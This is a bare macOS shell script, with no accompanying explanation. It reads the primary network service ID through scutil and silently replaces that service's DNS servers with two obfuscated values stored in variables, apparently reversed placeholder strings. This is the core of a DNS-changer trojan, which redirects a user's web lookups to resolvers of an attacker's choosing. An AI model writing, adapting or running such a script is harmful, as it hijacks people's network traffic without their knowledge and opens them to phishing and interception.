#!/bin/sh
path="/Library/Internet Plug-Ins"

VX1="TEERTS"
VX2="CIGAM"

PSID=$( (/usr/sbin/scutil | grep PrimaryService | sed -e 's/.*PrimaryService : //')<< EOF
open
get State:/Network/Global/IPv4
d.show
quit
EOF
)

/usr/sbin/scutil << EOF
open
d.init
d.add ServerAddresses * $VX1 $VX2
set State:/Network/Service/$PSID/DNS
quit
EOF
